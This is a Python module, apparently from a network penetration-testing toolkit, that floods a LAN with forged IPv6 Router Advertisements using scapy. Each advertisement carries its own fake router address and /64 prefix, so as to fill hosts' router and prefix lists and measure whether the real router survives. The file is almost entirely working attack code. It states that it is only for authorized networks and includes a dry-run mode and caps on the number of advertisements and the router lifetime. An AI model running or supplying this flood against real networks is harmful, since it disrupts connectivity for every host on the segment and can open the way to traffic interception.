"""Router Advertisement flooding: send many RAs, each from a different router and for a different prefix.

Hosts learn default routers and on-link prefixes from Router Advertisements (RFC 4861). Each RA from
an unknown router can add a default router entry, and each advertised /64 can create a SLAAC address
(RFC 4862). Hosts keep limited lists for both, and every RA costs processing on each listening host.

This module sends one RA per router. Each RA has its own link-local source address and its own /64,
taken from the prefix base you give, all sent from the operator's MAC to the all-nodes multicast
address with hop limit 255. The effects to measure are how many routers and prefixes a host accepts,
where it stops accepting them, and whether the legitimate router survives.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from itertools import islice
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import (
    ICMPv6ND_RA,
    ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptSrcLLAddr,
    IPv6,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import (
    ALL_NODES_IP,
    ALL_NODES_MAC,
    MAX_ROUTER_LIFETIME,
)

MAX_ADVERTISEMENTS = 500
DEFAULT_PREFIX_BASE = "2001:db8:f100::/48"


def validate_prefix_base(prefix: str) -> ipaddress.IPv6Network:
    """The base must hold enough /64 prefixes for the advertisements: between /16 and /48."""
    try:
        network = ipaddress.IPv6Network(prefix, strict=False)
    except ValueError as exc:
        raise ValueError(f"Prefix base {prefix!r} is not an IPv6 network.") from exc
    if not 16 <= network.prefixlen <= 48:
        raise ValueError("Prefix base must be between /16 and /48, so it holds enough /64 prefixes.")
    return network


def router_link_local(index: int) -> str:
    """Link-local source address for router number `index` (1-based): fe80::<index>."""
    return f"fe80::{index:x}"


@dataclass(frozen=True)
class RouterAdvertisementFloodingConfig:
    iface: str                              # attacker interface, on the segment with the victims
    source_mac: str                         # the Ethernet source MAC of every advertisement (required)
    prefix_base: str = DEFAULT_PREFIX_BASE  # /64 prefixes are taken from this block, one per advertisement
    advertisements: int = 50                # RAs sent, one router and one prefix each
    router_lifetime: int = 1800             # seconds each fake router stays on the host's list
    dry_run: bool = False                   # build RAs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        validate_prefix_base(self.prefix_base)
        if not 1 <= self.advertisements <= MAX_ADVERTISEMENTS:
            raise ValueError(f"Advertisements must be between 1 and {MAX_ADVERTISEMENTS}.")
        if not 1 <= self.router_lifetime <= MAX_ROUTER_LIFETIME:
            raise ValueError(f"Router lifetime must be between 1 and {MAX_ROUTER_LIFETIME} seconds.")


@dataclass
class RouterAdvertisementFloodingStats:
    advertisements: int = 0
    status: str = ""


def build_advertisements(config: RouterAdvertisementFloodingConfig) -> list[Packet]:
    """One RA per router: distinct link-local source, distinct /64 from the prefix base."""
    source = normalize_unicast_mac(config.source_mac)
    network = validate_prefix_base(config.prefix_base)
    subnets = islice(network.subnets(new_prefix=64), config.advertisements)
    frames = []
    for index, subnet in enumerate(subnets, start=1):
        frames.append(
            Ether(src=source, dst=ALL_NODES_MAC)
            / IPv6(src=router_link_local(index), dst=ALL_NODES_IP, hlim=255)
            / ICMPv6ND_RA(routerlifetime=config.router_lifetime, reachabletime=0, retranstimer=0)
            / ICMPv6NDOptSrcLLAddr(lladdr=source)
            / ICMPv6NDOptPrefixInfo(
                prefixlen=64, L=1, A=1, validlifetime=86400, preferredlifetime=14400,
                prefix=str(subnet.network_address),
            )
        )
    return frames


def run_router_advertisement_flooding(
    config: RouterAdvertisementFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RouterAdvertisementFloodingStats], None],
    send: Callable[..., Any] | None = None,
) -> RouterAdvertisementFloodingStats:
    """Send one RA per router, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = RouterAdvertisementFloodingStats(
            status=(
                f"Dry run: would send {config.advertisements} Router Advertisement(s) from "
                f"{config.advertisements} router address(es), each with its own /64 from {config.prefix_base}. "
                "Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = RouterAdvertisementFloodingStats()
    for frame in build_advertisements(config):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.advertisements} advertisement(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.advertisements += 1
        on_progress(replace(stats))
    return stats
